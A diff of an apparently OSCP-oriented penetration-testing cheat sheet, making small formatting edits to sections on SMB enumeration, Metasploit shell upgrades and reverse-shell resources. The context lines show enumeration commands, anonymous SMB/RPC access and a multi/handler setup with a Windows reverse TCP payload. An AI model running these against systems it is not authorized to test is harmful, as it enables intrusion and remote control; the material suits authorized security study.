@@ -31,7 +31,7 @@ Intense scan
 
 #### SMB/RPC  
 `enum4linux -a <IP>`  
-`nmap --script=smb* -p <PORT(S)> <IP>`  
+`nmap --script=smb* -p <PORTS> <IP>`  
 `rpcclient <IP> -U "" -N`  
 `showmount -e <IP>/<PORT>`  
 `mount -t cifs //<IP>/<SHARE> <LOCAL DIRECTORY> -o username="guest",password=""`  
@@ -109,9 +109,8 @@ See [msfvenom cheat sheet](http://thor-sec.com/cheatsheet/msfvenom_cheat_sheet/)
 `getprivs`  
 `session -i 1` ---puts you back into your session
 
-#### Turn a regular shell into a meterpreter shell  
- -  
-##### Attacker  
+#### Turn a regular shell into a meterpreter shell    
+#####    Attacker  
 - `use exploit/multi/handler`  
 - `set payload windows/shell/reverse_tcp`  
 - `set lhost <IP>`  
@@ -177,7 +176,7 @@ Symlinks and their pointers
 `ftp -s:script.txt`  
 
 #### Shells  
-See [resources section](http://thor-sec.com/review/oscp_review/#resource)  
+See [resources](http://thor-sec.com/review/oscp_review/#resource) section  
 [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)  
 
 # Post  
